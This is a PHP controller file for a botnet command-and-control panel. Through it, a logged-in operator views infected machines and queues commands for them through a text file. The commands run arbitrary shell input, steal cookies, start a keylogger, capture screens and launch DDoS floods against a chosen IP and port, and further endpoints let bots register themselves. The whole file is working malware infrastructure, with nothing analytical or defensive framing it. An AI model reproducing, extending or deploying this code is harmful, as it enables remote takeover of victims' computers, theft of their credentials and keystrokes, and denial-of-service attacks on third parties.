<?php
include_once("../Model/Bean/Bot.php");
include_once("../Model/BO/BO_Bot.php");
include_once("../utils/checkServerOn.php");
class C_Bot
{
    public function resetBotStatus()
    {
        $boBot = new BO_Bot();
        if (isset($_REQUEST['ID'])) {
            $boBot->resetBotStatusWithId($_REQUEST['ID']);
        } else {
            $boBot->resetBotStatus();
        }
    }
    public function view()
    {
        session_start();
        checkSocket();
        if (isset($_SESSION['login']) && $_SESSION['login'] == true) {
            $boBot = new BO_Bot();
            if (!isset($_REQUEST["page"]) || $_REQUEST["page"] == 0) {
                $listBot = $boBot->getAllBotPage(0);
            } else {
                $listBot = $boBot->getAllBotPage($_REQUEST["page"]);
            }
            $count = $boBot->getCountAllBot();
            $_SESSION['header_display'] = "All Bot";
            include_once("../View/listBot.php");


        } else {
            include_once('../View/noLogin.php');
        }
    }
    public function getBotActive()
    {
        session_start();
        checkSocket();
        if (isset($_SESSION['login']) && $_SESSION['login'] == true) {
            $boBot = new BO_Bot();
            if (!isset($_REQUEST["page"]) || $_REQUEST["page"] == 0) {
                $listBot = $boBot->getBotActivePage(0);
            } else {
                $listBot = $boBot->getBotActivePage($_REQUEST["page"]);
            }
            $count = $boBot->getCountBotActive();
            $_SESSION['header_display'] = "Bot Active";
            include_once("../View/listBot.php");
        } else {
            include_once('../View/noLogin.php');
        }
    }
    public function getBotPassive()
    {
        session_start();
        checkSocket();
        if (isset($_SESSION['login']) && $_SESSION['login'] == true) {
            $boBot = new BO_Bot();
            if(!isset($_REQUEST["page"])|| $_REQUEST["page"] ==0)
            {
                $listBot = $boBot->getBotPassivePage(0);
            }
            else
            {
                $listBot = $boBot->getBotPassivePage($_REQUEST["page"]);
            }
            $count = $boBot->getCountBotPassive();
            $_SESSION['header_display'] = "Bot Passive";
            include_once("../View/listBot.php");
        } else {
            include_once('../View/noLogin.php');
        }
    }
    public function putFileOneBot()
    {
        session_start();
        checkSocket();
        if (isset($_SESSION['login']) && $_SESSION['login'] == true) {
            $ID =  $_REQUEST['ID'];
            $boBot = new BO_Bot();
            $boBot->controlOneBot($ID);
            $bot = $boBot->getBotDetail($ID);
            include_once('../View/openBot.php');
        } else {
            include_once('../View/noLogin.php');
        }
    }
    public function controlBot()
    {
        session_start();
        checkSocket();
        if (isset($_SESSION['login']) && $_SESSION['login'] == true) {
            $cmdstr = $_REQUEST["cmdstr"];
            $function = $_REQUEST["function"];
            if ($function == "cmd") {
                $fp = fopen('../txt/commandBot.txt', 'w');
                fwrite($fp, "getcmd");
                fwrite($fp, '&');
                fwrite($fp, $cmdstr);
                fclose($fp);
            } else if ($function == "cookies") {
                $fp = fopen('../txt/commandBot.txt', 'w');
                fwrite($fp, "getcookie");
                fwrite($fp, '&');
                fwrite($fp, $cmdstr);
                fclose($fp);
            } else if ($function == "keylogger") {
                $temp = "abc";
                $fp = fopen('../txt/commandBot.txt', 'w');
                fwrite($fp, "getkeylogger");
                fwrite($fp, '&');
                fwrite($fp, $temp);
                fclose($fp);
            } else if ($function == "capture") {
                $fp = fopen('../txt/commandBot.txt', 'w');
                fwrite($fp, "getcapture");
                fwrite($fp, '&');
                fwrite($fp, "aaaa");
                fclose($fp);
            }
            $ID =  $_REQUEST['ID'];
            $boBot = new BO_Bot();
            if ($ID != "All") {
                $bot = $boBot->getBotDetail($ID);
                include_once('../View/openBot.php');
            } else {
                $bot = new Bot("All", "All", "All", 1, 0);
                include_once('../View/openBot.php');
            }
        } else {
            include_once('../View/noLogin.php');
        }
    }
    public function putFileAllBot()
    {
        session_start();
        checkSocket();
        if (isset($_SESSION['login']) && $_SESSION['login'] == true) {
            if(isset($_SESSION['serverStatus']) && $_SESSION['serverStatus'] == "online")
            {
                //$ID =  $_REQUEST['ID'];
                $boBot = new BO_Bot();
                $boBot->controlAllBot();
                //$bot = $boBot->getBotDetail($ID);
                $bot = new Bot("All", "All", "All", 1, 0);
                include_once('../View/openBot.php');
            }
            else
            {
                include_once('../View/noServer.php');
            }
           
        } else {
            include_once('../View/noLogin.php');
        }
    }
    public function addBot()
    {
        $ip = $_REQUEST["ip"];
        $port = $_REQUEST["port"];
        $boBot = new BO_Bot();
        $boBot->addBot($ip, $port);
    }
  
    public function resetCommandBot()
    {
        $fp = fopen('../txt/commandBot.txt', 'w');
        fwrite($fp, "");
        fclose($fp);
    }
    public function getIdBot()
    {
        $boBot = new BO_Bot();
        $ip = $_REQUEST["ip"];
        $port = $_REQUEST["port"];
        echo $boBot->getIdBot($ip, $port);
    }
    public function exitBot()
    {
        $boBot = new BO_Bot();
        $idBot = $_REQUEST["ID"];
        $boBot->exitBot($idBot);
        session_start();
        $header_display = isset($_SESSION['header_display']) ? $_SESSION['header_display'] : '';
        $listBot = $boBot->getAllBot();
        $count = $boBot->getCountAllBot();
        include_once("../View/listBot.php");
    }
    public function viewDDOS()
    {
        session_start();
        checkSocket();
        if (isset($_SESSION['login']) && $_SESSION['login'] == true) {
            include_once("../View/ddos.php");
        } else {
            include_once("../View/noLogin.php");
        }
    }
    public function DDOS()
    {
        $fp = fopen('../txt/commandBot.txt', 'w');
        fwrite($fp, "http");
        fwrite($fp, '&');
        fwrite($fp, $_REQUEST['ip']);
        fwrite($fp, ':');
        fwrite($fp, $_REQUEST['port']);
        fclose($fp);
        session_start();
        if (isset($_SESSION['login']) && $_SESSION['login'] == true) {
            include_once("../View/ddos.php");
        } else {
            include_once("../View/noLogin.php");
        }
    }
}
$C_Bot = new C_Bot();
if (isset($_REQUEST["opt"])) {
    $option = $_REQUEST["opt"];
    switch ($option) {
        case "view":
            $C_Bot->view();
            break;
        case "active":
            $C_Bot->getBotActive();
            break;
        case "passive":
            $C_Bot->getBotPassive();
            break;
        case "put1":
            $C_Bot->putFileOneBot();
            break;
        case "putall":
            $C_Bot->putFileAllBot();
            break;
        case "control":
            $C_Bot->controlBot();
            break;
        case "viewddos":
            $C_Bot->viewDDOS();
            break;
        case "ddos":
            $C_Bot->DDOS();
            break;
        case "add":
            $C_Bot->addBot();
            break;
        case "resetStatus":
            $C_Bot->resetBotStatus();
            break;
        case "resetCommand":
            $C_Bot->resetCommandBot();
            break;
        case "getId":
            $C_Bot->getIdBot();
            break;
        case "exit":
            $C_Bot->exitBot();
            break;
        default:
            break;
    }
}
